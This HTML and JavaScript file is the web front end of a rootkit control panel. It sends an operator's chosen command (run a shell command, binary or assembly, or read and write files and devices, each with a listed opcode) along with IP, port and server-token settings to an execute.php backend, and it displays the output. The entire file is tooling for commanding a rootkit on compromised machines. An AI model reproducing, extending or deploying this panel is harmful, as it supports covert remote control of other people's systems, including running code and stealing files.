<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Rootkit control panel</title>
    <link rel="stylesheet" href="style.css"> 
</head>
<body>
    <br>
    <h1>Rootkit control panel</h1>
    <br>
    <form id="commandForm" method="post" action="execute.php">
        <label for="command">Command:</label>
        <select id="command" name="command" required>
            <option value="EXECCMD">EXECCMD (0x30): Execute Command - Run a command</option>
            <option value="EXECBIN">EXECBIN (0x31): Execute Binary - Run binary code</option>
            <option value="EXECASM">EXECASM (0x32): Execute Assembly - Run assembly</option>
            <option value="DEVREAD">DEVREAD (0x33): Device Read - Read from a device</option>
            <option value="DEVWRITE">DEVWRITE (0x34): Device Write - Write to a device</option>
            <option value="DEVSHOW">DEVSHOW (0x35): Device Show - Show devices</option>
            <option value="FILEREAD">FILEREAD (0x36): File Read - Read from a file</option>
            <option value="FILEWRITE">FILEWRITE (0x37): File Write - Write to a file</option>
        </select><br><br>

        <label for="data">Data:</label>
        <input type="text" id="data" name="data"><br><br>

	<h4>Filter:<h4>
	<br>

        <label for="ip">IP Address:</label>
        <input type="text" id="ip" name="ip"><br><br>

        <label for="mask">Mask:</label>
        <input type="text" id="mask" name="mask"><br><br>

        <label for="port">Port:</label>
        <input type="text" id="port" name="port"><br><br>

        <label for="quiet">Quiet:</label>
        <input type="checkbox" id="quiet" name="quiet"><br><br>

        <label for="count_wait">Timeout in seconds:</label>
        <input type="text" id="count_wait" name="count_wait"><br><br>

	<div id="serverFields" style="display:none;">
	<h4>Server Options:<h4>
	<br>
            <label for="server_ip">Server IP:</label>
            <input type="text" id="server_ip" name="server_ip"><br><br>

            <label for="server_port">Server Port:</label>
            <input type="text" id="server_port" name="server_port"><br><br>

            <label for="server_token">Server Token:</label>
            <input type="password" id="server_token" name="server_token"><br><br>
        </div>

        <button type="submit">Execute</button>
        <button type="button" onclick="clearOutput()">Clear Output</button>
        <button type="button" onclick="toggleServerFields()">Show / Hide server options</button>

    <br>
    </form>
    <h2>Output:</h2>
    <div id="output-container" style="height: 200px; overflow-y: scroll;">
        <textarea id="output" readonly></textarea>
    </div>

    <script>
        document.getElementById('commandForm').onsubmit = function (event) {
            event.preventDefault();
            var form = event.target;
            var formData = new FormData(form);

            var xhr = new XMLHttpRequest();
            xhr.open('POST', form.action, true);
            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    var output = document.getElementById('output');
                    output.value += xhr.responseText + '\n';
                    output.scrollTop = output.scrollHeight;
                }
            };
            xhr.send(formData);
        };

        function clearOutput() {
            document.getElementById('output').value = '';
        }

        function toggleServerFields() {
            var serverFields = document.getElementById('serverFields');
            if (serverFields.style.display === 'none') {
                serverFields.style.display = 'block';
            } else {
                serverFields.style.display = 'none';
            }
        }
    </script>
</body>
</html>

